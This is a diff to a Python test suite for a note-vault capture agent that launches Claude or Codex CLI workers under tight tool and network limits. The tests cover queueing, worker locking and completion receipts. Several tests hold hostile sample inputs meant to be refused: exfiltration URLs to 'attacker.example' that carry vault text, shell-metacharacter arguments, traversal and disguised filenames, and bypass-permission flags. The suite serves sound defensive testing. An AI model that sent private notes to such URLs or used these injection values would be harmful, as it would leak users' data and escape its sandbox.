@@ -1,7 +1,8 @@
 """Opt-in capture agent: durable requests, bounded launch and observable completion.
 
 The tests use real temporary cards and job files, but no model, desktop notification,
-network request or agent CLI is started. Process and Win32 boundaries are stand-ins.
+network request or agent CLI is started. Most process/Win32 boundaries are stand-ins;
+dedicated tests launch two real POSIX workers and, on Windows, check native argv/aliases.
 Run from the repository root: python -m unittest discover -s tests -p v3_yakala_ajan_test.py -v
 """
 import base64
@@ -237,6 +238,128 @@ class AgentQueueTest(AgentFiles):
         self.assertEqual(again['session_id'], result['session_id'])
         self.assertEqual(yakala._agent_load_job(self.vault, self.state, result['job_id'])['request'], job['request'])
 
+    def test_repeated_delivery_wakes_a_durably_queued_job_after_sender_crash(self):
+        self.configure()
+        result, job, card = self.queued(delivery_id=uuid.uuid4().hex)
+        # No worker was actually launched by the fixture: this is the persisted
+        # state left by a sender dying between commit and its wake-up Popen.
+        self.spawned.reset_mock()
+        repeated = yakala.enqueue_agent(self.vault, self.state, card['id'], job['request'],
+                                        delivery_id=job['delivery_id'])
+        self.spawned.assert_called_once_with(self.vault, self.state)
+        self.assertEqual(repeated['job_id'], result['job_id'])
+        self.assertEqual(len(yakala._agent_jobs(self.vault, self.state)), 1)
+
+    def test_repeated_delivery_wakeup_failure_keeps_the_existing_job_queued(self):
+        self.configure()
+        result, job, card = self.queued(delivery_id=uuid.uuid4().hex)
+        self.spawned.side_effect = OSError('wake-up failed')
+        repeated = yakala.enqueue_agent(self.vault, self.state, card['id'], job['request'],
+                                        delivery_id=job['delivery_id'])
+        self.assertEqual(repeated['status'], 'ajan_baslatilamadi')
+        self.assertEqual(repeated['job_id'], result['job_id'])
+        self.assertEqual(yakala._agent_load_job(self.vault, self.state, job['id'])['state'], 'queued')
+
+    def test_corrupted_sort_key_cannot_stop_an_unrelated_queued_job(self):
+        self.configure()
+        _, damaged, _ = self.queued(text='Damaged queue record')
+        _, healthy, _ = self.queued(text='Healthy independent queue record')
+        damaged['created_ns'] = 'bad timestamp'
+        target = yakala._agent_job_dir(self.vault, self.state, damaged['id']) / 'job.json'
+        yakala._agent_json(target, damaged)
+        before = target.read_bytes()
+
+        def finish(vault, state, job):
+            yakala._agent_end(vault, state, job, 'approval_required', 'Test worker stopped safely.')
+
+        with patch.object(yakala, '_agent_run_job', side_effect=finish) as run:
+            self.assertEqual(yakala._agent_worker(self.vault, self.state), 0)
+        self.assertEqual([call.args[2]['id'] for call in run.call_args_list], [healthy['id']])
+        self.assertEqual(target.read_bytes(), before)
+        self.assertIn('Is kaydi okunamadi', (yakala._agent_root(self.state) / 'worker.log').read_text(encoding='utf-8'))
+
+    def test_job_stays_visible_when_last_session_is_renamed_and_startup_fails_safely(self):
+        last = self.vault / 'Last-Session.md'
+        last.write_text('# Last session\n', encoding='utf-8')
+        self.configure(last_session_path='Last-Session.md')
+        _, job, card = self.queued()
+        job['state'] = 'running'
+        yakala._agent_json(yakala._agent_job_dir(self.vault, self.state, job['id']) / 'job.json', job)
+        last.rename(self.vault / 'Session-Archive.md')
+
+        loaded = yakala._agent_load_job(self.vault, self.state, job['id'])
+        self.assertEqual([item['id'] for item in yakala._agent_jobs(self.vault, self.state)], [job['id']])
+        with patch.object(yakala, '_agent_executable') as launch:
+            yakala._agent_run_job(self.vault, self.state, loaded)
+        launch.assert_not_called()  # Startup still checks the actual memory path.
+        saved = yakala._agent_load_job(self.vault, self.state, job['id'])
+        self.assertEqual(saved['state'], 'approval_required')
+        self.assertEqual(yakala.find_card(self.vault, card['id'], self.state)['meta']['durum'], 'onay-bekliyor')
+        self.assertEqual([item['id'] for item in yakala._agent_jobs(self.vault, self.state)], [job['id']])
+        with self.assertRaises(ValueError):
+            yakala._agent_validate_settings(dict(saved['config'], last_session_path='../outside.md'),
+                                            self.vault, require_existing_paths=False)
+
+    def test_missing_reconciliation_summary_cannot_stop_an_unrelated_queued_job(self):
+        self.configure()
+        _, damaged, _ = self.queued(text='Damaged terminal reconciliation')
+        _, healthy, _ = self.queued(text='Healthy request after damaged reconciliation')
+        damaged.update(state='failed', card_reconcile=True)
+        damaged.pop('result_summary', None)
+        target = yakala._agent_job_dir(self.vault, self.state, damaged['id']) / 'job.json'
+        yakala._agent_json(target, damaged)
+        before = target.read_bytes()
+
+        def finish(vault, state, job):
+            yakala._agent_end(vault, state, job, 'approval_required', 'Test worker stopped safely.')
+
+        with patch.object(yakala, '_agent_run_job', side_effect=finish) as run:
+            self.assertEqual(yakala._agent_worker(self.vault, self.state), 0)
+        self.assertEqual([call.args[2]['id'] for call in run.call_args_list], [healthy['id']])
+        self.assertEqual(target.read_bytes(), before)
+        self.assertIn('Is kaydi okunamadi', (yakala._agent_root(self.state) / 'worker.log').read_text(encoding='utf-8'))
+
+    @unittest.skipIf(os.name == 'nt', 'This exercises POSIX flock with real workers; Win32 needs its native gate.')
+    def test_two_real_workers_run_each_job_once_without_overlapping(self):
+        self.configure()
+        _, first, _ = self.queued(text='First real worker test')
+        _, second, _ = self.queued(text='Second real worker test')
+        trace = Path(self.tmp.name) / 'worker-trace.txt'
+        active = Path(self.tmp.name) / 'worker-active'
+        script = '''import os, sys, time
+from pathlib import Path
+sys.path.insert(0, sys.argv[1])
+import beyin_v3_yakala as y
+vault, state, trace, active = map(Path, sys.argv[2:])
+y._agent_notify = lambda *args: None
+def run(vault, state, job):
+    fd = os.open(active, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
+    os.close(fd)
+    try:
+        with trace.open('a', encoding='utf-8') as out:
+            out.write(job['id'] + '\\n')
+            out.flush()
+        time.sleep(0.15)
+        y._agent_end(vault, state, job, 'approval_required', 'Real worker lock test')
+    finally:
+        active.unlink()
+y._agent_run_job = run
+sys.exit(y._agent_worker(vault, state))
+'''
+        command = [sys.executable, '-c', script, str(SCRIPTS), str(self.vault), str(self.state), str(trace), str(active)]
+        workers = [subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE) for _ in range(2)]
+        try:
+            for worker in workers:
+                output, error = worker.communicate(timeout=15)
+                self.assertEqual(worker.returncode, 0, (output + error).decode('utf-8', 'replace'))
+        finally:
+            for worker in workers:
+                if worker.poll() is None:
+                    worker.kill()
+                    worker.wait(timeout=5)
+        self.assertCountEqual(trace.read_text(encoding='utf-8').splitlines(), [first['id'], second['id']])
+        self.assertFalse(active.exists())
+
     def test_recaptured_url_uses_the_current_request_not_the_first_neden_section(self):
         self.configure()
         saved, original = self.card(url='https://example.com/source', why='Bu eski istek.')
@@ -310,7 +433,7 @@ class AgentLinkedRootTest(unittest.TestCase):
 
     def test_linked_prefix_above_vault_state_and_downloads_is_accepted(self):
         self.assertEqual(yakala.agent_settings(self.vault, self.state)['client'], 'kapali')
-        yakala.configure_agent(self.vault, self.state, 'claude')
+        yakala.configure_agent(self.vault, self.state, 'claude', network='acik')  # a direct file URL the page did not link
         saved = yakala.capture(self.vault, url='https://example.com/music', why='Find the music', state=self.state)
         # `beyin.py yakala ajan-devam` passes the state exactly as resolve_state() spelled it.
         queued = yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Find the music')
@@ -406,7 +529,9 @@ class AgentCommandTest(AgentFiles):
         self.assertIn('--strict-mcp-config', argv)
         self.assertIn('--no-chrome', argv)
         self.assertIn('--tools', argv)
-        self.assertNotIn('Bash', argv[argv.index('--tools') + 1])
+        self.assertEqual(argv[argv.index('--tools') + 1], '')
+        self.assertEqual(argv[argv.index('--allowedTools') + 1], 'mcp__yakala__*')
+        self.assertNotIn('WebSearch', argv)
         self.assertIn('--output-format', argv)
         for flag in ('--bare', '--dangerously-skip-permissions', 'bypassPermissions'):
             self.assertNotIn(flag, argv)
@@ -423,6 +548,8 @@ class AgentCommandTest(AgentFiles):
         self.assertIn('--skip-git-repo-check', argv)
         self.assertIn('features.shell_tool=false', argv)
         self.assertIn('features.apps=false', argv)
+        self.assertIn('web_search="disabled"', argv)
+        self.assertIn('mcp_servers.yakala.enabled=true', argv)
         self.assertNotIn('--session-id', argv)
         self.assertNotIn('--ephemeral', argv)
         for flag in ('danger-full-access', '--yolo', '--dangerously-bypass-approvals-and-sandbox'):
@@ -438,6 +565,57 @@ class AgentCommandTest(AgentFiles):
         self.assertIn('https://example.com/article', prompt)
         for required in ('AGENTS.md', 'CLAUDE.md', 'beyin-yakala', 'receipt', 'Last-Session'):
             self.assertIn(required, prompt)
+        self.assertIn('--file <receipt.json>', prompt)
+        self.assertIn('companion kartiyla', prompt)
+        self.assertNotIn('--session <gercek_oturum_id>', prompt)
+
+
+class AgentNetworkOptionTest(AgentFiles):
+    """ag=kisitli is the default (exact source URLs only); ag=acik is an explicit research opt-in."""
+
+    def argv(self, client, network=None):
+        self.configure(client)
+        if network:
+            yakala.configure_agent(self.vault, self.state, client, network=network)
+        result, job, card = self.queued(url='https://example.com/post')
+        with patch.object(yakala, '_agent_executable', return_value=['agent.exe']):
+            return yakala._agent_command(self.vault, self.state, job, job['config']), job
+
+    def test_restricted_is_the_default_and_old_settings_load(self):
+        argv, job = self.argv('claude')
+        self.assertEqual(job['config']['ag'], 'kisitli')
+        self.assertEqual(argv[argv.index('--tools') + 1], '')
+        self.assertNotIn('WebSearch', ' '.join(argv))
+        saved = json.loads(self.config_path.read_text(encoding='utf-8'))
+        saved.pop('ag')
+        self.config_path.write_text(json.dumps(saved), encoding='utf-8')
+        self.assertEqual(yakala.agent_settings(self.vault, self.state)['ag'], 'kisitli')
+
+    def test_open_network_restores_search_and_any_public_url(self):
+        argv, job = self.argv('claude', 'acik')
+        self.assertEqual(argv[argv.index('--tools') + 1], 'WebSearch')
+        self.assertEqual(argv[argv.index('--allowedTools') + 1], 'WebSearch,mcp__yakala__*')
+        self.assertIn('Not iceriklerini arama sorgusuna', yakala._agent_prompt(self.vault, job))
+
+    def test_open_network_turns_codex_hosted_search_on(self):
+        codex, _ = self.argv('codex', 'acik')
+        self.assertIn('web_search="live"', codex)
+        self.assertNotIn('web_search="disabled"', codex)
+
+    def test_open_network_skips_the_exact_url_capability_check(self):
+        self.configure('claude')
+        yakala.configure_agent(self.vault, self.state, 'claude', network='acik')
+        result, job, card = self.queued(url='https://example.com/post')
+        job['state'] = 'running'
+        yakala._agent_json(yakala._agent_job_dir(self.vault, self.state, job['id']) / 'job.json', job)
+        fetched = {'url': 'https://other.example/x', 'links': []}
+        with patch.object(yakala, '_agent_fetch_source', return_value=fetched) as fetch:
+            yakala._agent_tool_call(self.vault, self.state, job['id'], 'fetch_source', {'url': 'https://other.example/x'})
+        fetch.assert_called_once_with('https://other.example/x')
+
+    def test_invalid_network_value_is_refused(self):
+        with self.assertRaises(ValueError):
+            self.configure('claude', ag='hepsi')
 
 
 class AgentWindowViewTest(AgentFiles):
@@ -476,14 +654,57 @@ class AgentWindowViewTest(AgentFiles):
         for flag in ('--strict-mcp-config', '--no-chrome', '--session-id'):
             self.assertIn(flag, argv)
         self.assertEqual(argv[argv.index('--session-id') + 1], result['session_id'])
-        self.assertEqual(argv[argv.index('--tools') + 1], 'WebSearch')
+        self.assertEqual(argv[argv.index('--tools') + 1], '')
+        self.assertEqual(argv[argv.index('--allowedTools') + 1], 'mcp__yakala__*')
         self.assertEqual(argv[argv.index('--permission-mode') + 1], 'dontAsk')
+        self.assertNotIn('--permission-prompts', argv)  # documented only for print mode
         for flag in ('--dangerously-skip-permissions', 'bypassPermissions', '--bare'):
             self.assertNotIn(flag, argv)
         # The request travels only inside the single prompt argument, after every option.
         self.assertTrue(argv[-1].startswith('Bu vault icinde'))
+        self.assertEqual(argv[-2], '--')
         self.assertIn('canli izliyor', argv[-1])
+        self.assertIn('basarinin henuz dogrulanmadigini', argv[-1])
+        self.assertNotIn('birkac saniye icinde', argv[-1])
         self.assertEqual([item for item in argv if 'Müziği bul' in item], [argv[-1]])
+
+    def test_valid_request_can_exceed_createprocess_limit_after_json_and_quoting(self):
+        result, saved_job, card = self.windowed(request='"' * yakala.AGENT_MAX_REQUEST)
+        for character in ('"', '\\', '\U0001F680', '\x01'):
+            with self.subTest(character=repr(character)):
+                job = dict(saved_job, request=character * yakala.AGENT_MAX_REQUEST)
+                with patch.object(yakala, '_agent_window_supported', return_value=True), \
+                        patch.object(yakala, '_agent_executable', return_value=['C:/Claude/claude.exe']), \
+                        self.assertRaisesRegex(ValueError, 'gizli'):
+                    yakala._agent_command(self.vault, self.state, job, job['config'])
+                self.assertTrue(card['path'].is_file())
+
+    def test_long_request_still_works_with_stdin_in_hidden_mode(self):
+        self.configure('claude')
+        result, job, card = self.queued(request='"' * yakala.AGENT_MAX_REQUEST)
+        with patch.object(yakala, '_agent_executable', return_value=['C:/Claude/claude.exe']):
+            argv = yakala._agent_command(self.vault, self.state, job, job['config'])
+        self.assertIn('-p', argv)
+        self.assertNotIn(job['request'], argv)
+
+    def test_windows_argv_limit_counts_utf16_and_terminator(self):
+        base = ['C:/claude.exe', '--', '']
+        overhead = len(subprocess.list2cmdline(base[:-1]).encode('utf-16-le')) // 2 + 1
+        # One separator and one terminating NUL are included in the 32,767 total.
+        accepted = [*base[:-1], 'a' * (32766 - overhead)]
+        self.assertEqual(yakala._agent_windows_argv(accepted), accepted)
+        with self.assertRaises(ValueError):
+            yakala._agent_windows_argv([*base[:-1], accepted[-1] + 'a'])
+
+    @unittest.skipUnless(os.name == 'nt', 'requires real Windows CreateProcessW')
+    def test_real_windows_argv_round_trip_has_no_shell_expansion(self):
+        values = ['--dangerously-skip-permissions', '" & %PATH% ^ ! <> $(x)',
+                  '\U0001F680 Örnek', 'tail \\\\', 'quote \\\" end', 'line\nnext']
+        command = [sys.executable, '-c',
+                   'import json,sys; print(json.dumps(sys.argv[1:], ensure_ascii=True))', *values]
+        result = subprocess.run(yakala._agent_windows_argv(command), capture_output=True,
+                                text=True, check=True, timeout=15, shell=False)
+        self.assertEqual(json.loads(result.stdout), values)
 
     def run_window(self, poll, manifest):
         result, job, card = self.windowed()
@@ -762,6 +983,7 @@ class AgentFinalizationTest(AgentFiles):
         self.assertEqual(card.count(b'\n'), card.count(newline))  # the file keeps one line ending
         self.assertRegex(card.decode('utf-8'), r'^## \d{4}-\d\d-\d\d \d\d:\d\d · Yakala ajanı / Claude · ' +
                          fixture.job['session_id'][:8] + r'\r?\n')
+        return fixture.last.read_text(encoding='utf-8')
 
     def prepared(self, download_names=('track.mp3',)):
         (self.vault / 'beyin.py').write_text('# Test receipt entry; never executed.\n', encoding='utf-8')
@@ -786,6 +1008,10 @@ class AgentFinalizationTest(AgentFiles):
                     'sha256': hashlib.sha256(self.TRACK).hexdigest()}
 
         downloads = []
+        source = {'url': job['url'], 'text': 'Available tracks',
+                  'links': ['https://example.com/' + name for name in download_names]}
+        with patch.object(yakala, '_agent_fetch_source', return_value=source):
+            yakala._agent_tool_call(self.vault, self.state, job['id'], 'fetch_source', {'url': job['url']})
         with patch.object(yakala, '_agent_public_get', side_effect=fetch):
             for filename in download_names:
                 downloads.append(yakala._agent_tool_call(self.vault, self.state, job['id'], 'download',
@@ -798,7 +1024,7 @@ class AgentFinalizationTest(AgentFiles):
                                      note=note, note_before=(self.vault / note['path']).read_bytes(), downloads=downloads,
                                      target=self.downloads / ('track-yakala-' + job['id'][:8] + '.mp3'))
 
-    def receipt_process(self, fixture, source='valid', status='recorded'):
+    def receipt_process(self, fixture, source='valid', status='succeeded'):
         """Model the probed integration contract; no beyin.py implementation is assumed or executed."""
         def run(argv, timeout, cwd=None):
             self.assertEqual(argv[1:3], [str(self.vault / 'beyin.py'), 'receipt'])
@@ -850,8 +1076,7 @@ class AgentFinalizationTest(AgentFiles):
         self.assertEqual(saved['published'][0]['source_url'], 'https://example.com/track.mp3')
         self.assertTrue((self.vault / saved['outcome']).is_file())
         self.assertIn('yakala-' + fixture.job['id'], (self.vault / saved['receipt']).read_text(encoding='utf-8'))
-        last = fixture.last.read_text(encoding='utf-8')
-        self.assertNewestCard(fixture)
+        last = self.assertNewestCard(fixture)
         for reference in (fixture.job['card_path'], saved['outcome'], saved['receipt'], fixture.job['session_id']):
             self.assertIn(reference, last)
         self.assertEqual(last.count('<!-- yakala-ajan:' + fixture.job['id'] + ' -->'), 1)
@@ -862,6 +1087,22 @@ class AgentFinalizationTest(AgentFiles):
         self.assertEqual(card['meta']['durum'], 'islendi')
         self.assertEqual(card['meta']['ajan_receipt'], saved['receipt'])
         self.assertEqual(card['body'], fixture.card['body'])
+
+    def test_change_seen_before_replace_keeps_the_other_writer_and_adds_no_card(self):
+        # Accepted residual risk (documented): a write landing after this check and before
+        # os.replace is lost; there is no portable compare-and-swap for tools without our lock.
+        fixture = self.prepared(download_names=())
+        concurrent = fixture.last_before + b'Concurrent editor: important new decision.\r\n'
+        original = yakala._agent_insert_card
+
+        def insert(before, card):
+            fixture.last.write_bytes(concurrent)
+            return original(before, card)
+
+        with self.receipt_process(fixture), patch.object(yakala, '_agent_insert_card', side_effect=insert), \
+                self.assertRaises(ValueError):
+            yakala._agent_finalize(self.vault, self.state, fixture.job)
+        self.assertEqual(fixture.last.read_bytes(), concurrent)
 
     def test_unverified_receipt_keeps_outputs_and_never_overwrites_prior_memory(self):
         fixture = self.prepared()
@@ -887,6 +1128,20 @@ class AgentFinalizationTest(AgentFiles):
         self.assertEqual(fixture.last.read_bytes(), fixture.last_before)
         self.assertNotEqual(yakala._agent_load_job(self.vault, self.state, fixture.job['id'])['state'], 'completed')
 
+    def test_unknown_receipt_status_is_not_treated_as_verified_success(self):
+        (self.vault / 'beyin.py').write_text('# Test receipt entry; never executed.\n', encoding='utf-8')
+        (self.vault / 'memory').mkdir()
+        self.configure()
+        for status in ('queued', 'timeout', 'unknown', 'approval_required', 'onay-bekliyor', 'success', ' Recorded '):
+            with self.subTest(status=status):
+                # Every adapter call has a distinct event/source, with a real
+                # saved capture and job but no runtime/model subprocess.
+                _, job, _ = self.queued(text='Receipt status ' + status)
+                fixture = types.SimpleNamespace(job=job, note={'path': job['card_path']})
+                refs = [fixture.job['card_path'], fixture.note['path']]
+                with self.receipt_process(fixture, status=status), self.assertRaises(ValueError):
+                    yakala._agent_receipt(self.vault, self.state, fixture.job, 'Check pending status', refs)
+
     def test_partial_publication_preserves_existing_target_and_records_actual_effects(self):
         fixture = self.prepared(download_names=('track.mp3', 'existing.mp3'))
         conflict = self.downloads / ('existing-yakala-' + fixture.job['id'][:8] + '.mp3')
@@ -910,8 +1165,7 @@ class AgentFinalizationTest(AgentFiles):
         payload = json.loads((folder / 'receipt.json').read_text(encoding='utf-8'))
         self.assertIn('approval_required', payload['summary'])
         self.assertIn(saved['outcome'], payload['refs'])
-        last = fixture.last.read_text(encoding='utf-8')
-        self.assertNewestCard(fixture)
+        last = self.assertNewestCard(fixture)
         self.assertIn(saved['receipt'], last)
         partial = conflict.with_name(conflict.name + '.part')
         self.assertEqual(partial.read_bytes(), self.TRACK)
@@ -1446,7 +1700,7 @@ class AgentBridgeFilesTest(unittest.TestCase):
     def note(self, path, content='Example text'):
         target = self.vault / path
         target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text(content, encoding='utf-8')
+        target.write_text(content, encoding='utf-8', newline='')  # keep the given line endings on Windows too
         return target
 
     def transfer(self, body=b'ID3\x04\0\0\0\0\0\0a test track'):
@@ -1456,6 +1710,14 @@ class AgentBridgeFilesTest(unittest.TestCase):
             return {'url': url, 'body': None, 'bytes': len(body), 'content_type': 'audio/mpeg',
                     'sha256': hashlib.sha256(body).hexdigest()}
         return patch.object(yakala, '_agent_public_get', side_effect=fetch)
+
+    def authorize_links(self, *urls):
+        import html
+        body = ('<html>' + ''.join('<a href="' + html.escape(url, quote=True) + '">source</a>'
+                                 for url in urls) + '</html>').encode('utf-8')
+        with patch.object(yakala, '_agent_public_get', return_value={
+                'url': self.job['url'], 'body': body, 'content_type': 'text/html; charset=utf-8'}):
+            return self.call('fetch_source', url=self.job['url'])
 
     def test_visible_notes_and_exact_control_files_are_available(self):
         for path in ('knowledge/concept.md', 'AGENTS.md', 'CLAUDE.md',
@@ -1647,6 +1909,7 @@ class AgentBridgeFilesTest(unittest.TestCase):
                 self.call('write_note', title=title, content=content)
 
     def test_download_stages_valid_data_records_hash_and_refuses_overwrite(self):
+        self.authorize_links('https://example.com/track.mp3')
         with self.transfer():
             result = self.call('download', url='https://example.com/track.mp3', filename='track.mp3')
             with self.assertRaises(FileExistsError):
@@ -1657,6 +1920,7 @@ class AgentBridgeFilesTest(unittest.TestCase):
         self.assertEqual(registered, result)
 
     def test_download_refuses_executables_names_and_disguised_binary(self):
+        self.authorize_links('https://example.com/a')
         with patch.object(yakala, '_agent_public_get') as fetch:
             for name in ('x.exe', 'x.py', '../x.mp3', 'NUL.txt', 'x.mp3:evil', 'x.mp3.cmd'):
                 with self.assertRaises(ValueError):
@@ -1668,6 +1932,7 @@ class AgentBridgeFilesTest(unittest.TestCase):
         self.assertFalse((self.job_folder / 'downloads/song.mp3').exists())
 
     def test_complete_records_owned_outputs_and_is_idempotent(self):
+        self.authorize_links('https://example.com/a.mp3')
         note = self.call('write_note', title='Result', content='Verified result')
         with self.transfer():
             download = self.call('download', url='https://example.com/a.mp3', filename='song.mp3')
@@ -1682,7 +1947,20 @@ class AgentBridgeFilesTest(unittest.TestCase):
         with self.assertRaises(ValueError):
             self.call('write_note', title='Late mutation', content='no')
 
+    def test_complete_auto_notes_remain_idempotent_after_worker_writes_its_host_result(self):
+        note = self.call('write_note', title='Result', content='Agent-produced result.')
+        arguments = {'status': 'completed', 'summary': 'Submitted result.'}
+        before = self.call('complete', **arguments)
+        note_root = (self.vault / note['path']).parent
+        (note_root / '__host-result.md').write_text(yakala._dump(
+            {'tur': 'yakala-ajan-sonucu', 'ajan_isi': self.job['id'], 'visibility': 'private'},
+            '# Trusted worker result'), encoding='utf-8')
+        self.assertEqual(self.call('complete', **arguments), before)
+        manifest = json.loads((self.job_folder / 'result.json').read_text(encoding='utf-8'))
+        self.assertEqual(manifest['notes'], [note['path']])
+
     def test_complete_refuses_foreign_note_and_forged_download(self):
+        self.authorize_links('https://example.com/a.mp3')
         self.note('knowledge/existing.md')
         with self.assertRaises(ValueError):
             self.call('complete', status='completed', summary='result', notes=['knowledge/existing.md'])
@@ -1692,6 +1970,167 @@ class AgentBridgeFilesTest(unittest.TestCase):
             with self.assertRaises(ValueError):
                 self.call('complete', status='completed', summary='result', downloads=[bad])
         self.assertFalse((self.job_folder / 'result.json').exists())
+
+    def test_yaml_privacy_syntax_cannot_be_downgraded_to_an_unknown_plain_scalar(self):
+        canary = 'privacy-syntax-canary'
+        headers = (
+            'sensitivity: GİZLİ',
+            'SENSİTİVİTY: secret',
+            'sensitivity: !!str secret',
+            'sensitivity: &privacy secret',
+            r'sensitivity: "\x73ecret"',
+            r'"\x72emote_allowed": false',
+            'sensitivity:\n  - secret',
+            'sensitivity: [secret]',
+            'sensitivity: null',
+            'title: ordinary\n---extra: valid-yaml-key\nremote_allowed: false',
+        )
+        for index, front in enumerate(headers):
+            path = 'knowledge/syntax-%02d.md' % index
+            self.note(path, '---\n' + front + '\n---\n' + canary)
+            with self.subTest(header=front), self.assertRaises(ValueError):
+                self.call('read_note', path=path)
+        self.assertEqual(self.call('search_notes', query=canary)['matches'], [])
+
+    def test_simple_allowed_yaml_and_json_values_keep_working_with_crlf(self):
+        headers = (
+            'remote_allowed: true\nsensitivity: ordinary # safe',
+            '"remote_allowed": "true" # explicit\nsensitivity: "ordinary"',
+            "'remote_allowed': 'true'\ntags: [\"one\", \"two\"]",
+            '{"remote_allowed": true, "sensitivity": "ordinary"}',
+        )
+        for index, front in enumerate(headers):
+            path = 'knowledge/ordinary-%02d.md' % index
+            self.note(path, ('---\n' + front + '\n---\nallowed scalar text').replace('\n', '\r\n'))
+            with self.subTest(header=front):
+                self.assertIn('allowed scalar text', self.call('read_note', path=path)['text'])
+
+    def test_case_alias_of_attachment_store_still_requires_this_cards_link(self):
+        parent = Path(self.job['card_path']).parent
+        self.note((parent / yakala.FILES / 'foreign.txt').as_posix(), 'OTHER_CAPTURE_CANARY')
+        original = yakala._agent_checked_path
+
+        def case_insensitive_lookup(root, parts, create=False):
+            return original(root, [yakala.FILES if part.casefold() == yakala.FILES else part for part in parts],
+                            create=create)
+
+        # Exercise the Windows/macOS lookup rule on all hosts; native integration is below.
+        with patch.object(yakala, '_agent_checked_path', side_effect=case_insensitive_lookup):
+            with self.assertRaises(ValueError):
+                self.call('read_note', path=(parent / 'DOSYALAR' / 'foreign.txt').as_posix())
+
+    def test_search_never_walks_case_variants_of_attachment_store(self):
+        self.note('knowledge/DOSYALAR/foreign.md', 'ATTACHMENT_SEARCH_CANARY')
+        self.assertEqual(self.call('search_notes', query='ATTACHMENT_SEARCH_CANARY')['matches'], [])
+
+    def test_canonical_long_name_is_checked_after_an_alias_lookup(self):
+        self.note('.hidden/ordinary.md', 'HIDDEN_ALIAS_CANARY')
+        original = yakala._agent_checked_path
+
+        def short_name_lookup(root, parts, create=False):
+            if parts == ['HIDDEN~1', 'ordinary.md']:
+                return original(root, ['.hidden', 'ordinary.md'], create=create)
+            return original(root, parts, create=create)
+
+        with patch.object(yakala, '_agent_checked_path', side_effect=short_name_lookup):
+            with self.assertRaises(ValueError):
+                self.call('read_note', path='HIDDEN~1/ordinary.md')
+
+    @unittest.skipUnless(os.name == 'nt' and sys.platform == 'win32', 'Native Windows path aliases')
+    def test_native_windows_attachment_case_and_short_hidden_alias(self):
+        parent = Path(self.job['card_path']).parent
+        self.note((parent / yakala.FILES / 'foreign.txt').as_posix(), 'OTHER_CAPTURE_CANARY')
+        with self.assertRaises(ValueError):
+            self.call('read_note', path=(parent / 'DOSYALAR' / 'foreign.txt').as_posix())
+        hidden = self.note('.hidden-directory/ordinary.md', 'HIDDEN_ALIAS_CANARY').parent
+        kernel = C.WinDLL('kernel32', use_last_error=True)
+        convert = kernel.GetShortPathNameW
+        convert.argtypes = (C.c_wchar_p, C.c_wchar_p, C.c_uint32)
+        convert.restype = C.c_uint32
+        buffer = C.create_unicode_buffer(32768)
+        length = convert(str(hidden), buffer, len(buffer))
+        if not length or length >= len(buffer):
+            self.skipTest('8.3 short names are unavailable on this filesystem.')
+        alias = Path(buffer.value).name
+        if alias.startswith('.') or alias.casefold() == hidden.name.casefold():
+            self.skipTest('The filesystem did not assign an alternate 8.3 name.')
+        with self.assertRaises(ValueError):
+            self.call('read_note', path=alias + '/ordinary.md')
+
+    def test_arbitrary_public_url_cannot_transmit_vault_text(self):
+        self.note('knowledge/ordinary.md', 'VAULT_CANARY_7291')
+        canary = self.call('read_note', path='knowledge/ordinary.md')['text']
+        malicious = (
+            'https://attacker.example/collect?text=' + canary,
+            'https://' + canary.lower() + '.attacker.example/',
+            self.job['url'] + '?text=' + canary,
+            self.job['url'] + '/' + canary,
+        )
+        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
+            for url in malicious:
+                for tool, extra in (('fetch_source', {}), ('download', {'filename': 'payload.txt'})):
+                    with self.subTest(url=url, tool=tool), self.assertRaises(ValueError):
+                        self.call(tool, url=url, **extra)
+            fetched.assert_not_called()
+
+    def test_exact_source_links_can_be_downloaded_but_modifying_them_is_denied(self):
+        url = 'https://cdn.example.com/track.mp3?version=1'
+        source = self.authorize_links(url)
+        self.assertIn(url, source['links'])
+        with self.transfer():
+            result = self.call('download', url=url, filename='permitted.mp3')
+        self.assertEqual(result['source_url'], url)
+        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
+            for changed in (url + '&private=CANARY', url.replace('version=1', 'version=2'),
+                            url.replace('cdn.example.com', 'attacker.example')):
+                with self.subTest(url=changed), self.assertRaises(ValueError):
+                    self.call('fetch_source', url=changed)
+            fetched.assert_not_called()
+
+    def test_successful_complete_revokes_reads_search_and_fetch_immediately(self):
+        self.note('knowledge/ordinary.md', 'ordinary')
+        result = {'status': 'completed', 'summary': 'Done.'}
+        self.call('complete', **result)
+        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
+            for tool, args in (('read_note', {'path': 'knowledge/ordinary.md'}),
+                               ('search_notes', {'query': 'ordinary'}),
+                               ('fetch_source', {'url': self.job['url']})):
+                with self.subTest(tool=tool), self.assertRaises(ValueError):
+                    self.call(tool, **args)
+            fetched.assert_not_called()
+        self.assertTrue(self.call('complete', **result)['accepted'])
+
+    def test_complete_acknowledges_submission_without_claiming_worker_success(self):
+        result = self.call('complete', status='completed', summary='Model considers its work done.')
+        self.assertTrue(result['accepted'])
+        self.assertEqual(result['status'], 'submitted')
+        self.assertEqual(result['requested_status'], 'completed')
+        self.assertFalse(result['completion_verified'])
+        self.assertEqual(self.job['state'], 'running')
+
+    def test_completion_manifest_is_invisible_until_its_snapshot_is_durable(self):
+        target = self.job_folder / 'result.json'
+        original = yakala.os.fsync
+        snapshots = []
+
+        def inspect_before_commit(descriptor):
+            snapshots.append(target.exists())
+            return original(descriptor)
+
+        with patch.object(yakala.os, 'fsync', side_effect=inspect_before_commit):
+            self.call('complete', status='completed', summary='Durable result.')
+        # The first fsync belongs to private staged content. A later directory fsync may see the commit.
+        self.assertFalse(snapshots[0])
+        self.assertEqual(json.loads(target.read_text(encoding='utf-8'))['summary'], 'Durable result.')
+        self.assertEqual(list(self.job_folder.glob('.ajan-new-*')), [])
+
+    def test_failed_atomic_completion_publication_leaves_no_partial_manifest(self):
+        target = self.job_folder / 'result.json'
+        with patch.object(yakala.os, 'link', side_effect=OSError('filesystem has no atomic create-only link')):
+            with self.assertRaises(OSError):
+                self.call('complete', status='completed', summary='Must not appear early.')
+        self.assertFalse(target.exists())
+        self.assertEqual(list(self.job_folder.glob('.ajan-new-*')), [])
 
     def protocol(self, messages):
